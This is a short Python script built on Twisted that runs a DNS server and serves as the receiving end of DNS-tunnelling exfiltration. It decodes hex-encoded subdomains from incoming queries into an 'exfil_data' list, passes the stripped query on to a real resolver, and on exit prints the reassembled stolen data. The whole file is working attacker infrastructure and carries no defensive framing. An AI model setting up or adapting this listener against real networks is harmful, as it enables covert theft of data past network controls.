#!/usr/bin/python3

# dependencies:
# apt-get install -V python3-twisted python3

from twisted.internet import defer, reactor
from twisted.names import server, error, client, dns

# listening port
udp_port = 53

# server must be able to resolve dns queries
resolv_conf = '/etc/resolv.conf'

# array to store decoded subdomains, don't modify this
exfil_data = []

class DecodeSubdomain:
    """
    decode subdomain and update query.name before resolving
    """
    def query(self, query, timeout=None):
        # seperate subdomain from domain and convert to string array
        query_name = str(query.name).split('.', 1)

        # decode subdomain hex value(s)
        decoded_hex = bytes.fromhex(query_name[0]).decode('utf-8')

        # append decoded value to array
        exfil_data.append(decoded_hex)

        # update query.name to exclude subdomain before resolving A record
        query.name.name = str.encode(query_name[1])

        # print with fancy formatting
        print('\033[32m{:>6}\033[0m : {}'.format(decoded_hex, '.'.join(query_name)))

        return defer.fail(error.DomainError())

# https://docs.twistedmatrix.com/en/twisted-16.1.1/names/howto/custom-server.html
def main():
    factory = server.DNSServerFactory(
        clients=[DecodeSubdomain(), client.Resolver(resolv=resolv_conf)]
    )
    reactor.listenUDP(udp_port, dns.DNSDatagramProtocol(controller=factory))
    reactor.run()

    # when Ctrl+C is pressed, concatenate decoded hex values
    print("\n\n", ''.join(exfil_data))

if __name__ == '__main__':
    raise SystemExit(main())
